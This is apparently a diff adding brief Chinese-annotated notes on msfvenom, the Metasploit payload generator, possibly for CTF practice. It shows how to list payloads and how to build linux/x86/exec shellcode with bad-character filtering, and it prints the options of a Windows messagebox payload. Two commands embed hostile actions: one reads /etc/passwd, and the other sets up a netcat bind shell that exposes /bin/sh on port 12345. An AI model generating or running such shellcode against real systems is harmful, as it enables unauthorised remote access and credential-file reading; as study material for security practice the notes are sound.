@@ -1,0 +1,73 @@
+
+
+=====================================================================
+show payloads
+
+./msfvenom -l payloads
+列出可以的payload
+
+
+
+
+
+=====================================================================
+
+
+一般使用最多的是linux/x86/exec
+
+./msfvenom -p linux/x86/exec -b '\x00\x20' -f c CMD="cat /etc/passwd"
+
+
+-b选项是指定shellcode中不要含有的字符
+
+
+
+./msfvenom -p linux/x86/exec -b '\x00\x20' -f c CMD="mkfifo /tmp/tmp_fifo; cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l -p 12345 > /tmp/tmp_fifo"    
+
+
+==================================================================
+
+show options:
+
+
+msfvenom -p windows/messagebox -o
+
+
+ [*] Options for payload/windows/messagebox
+
+
+       Name: Windows MessageBox
+     Module: payload/windows/messagebox
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 270
+       Rank: Normal
+
+Provided by:
+    corelanc0d3r <peter.ve@corelan.be>
+    jduck <jduck@metasploit.com>
+
+Basic options:
+Name      Current Setting   Required  Description
+----      ---------------   --------  -----------
+EXITFUNC  process           yes       Exit technique: seh, thread, process, none
+ICON      NO                yes       Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION
+TEXT      Hello, from MSF!  yes       Messagebox Text (max 255 chars)
+TITLE     MessageBox        yes       Messagebox Title (max 255 chars)
+
+Description:
+  Spawns a dialog via MessageBox using a customizable title, text & 
+  icon
+
+
+
+=====================================================================
+
+set option:
+
+msfvenom -p windows/messagebox  -f c   TEXT="ISCC"
+
+===================================================================
+
+
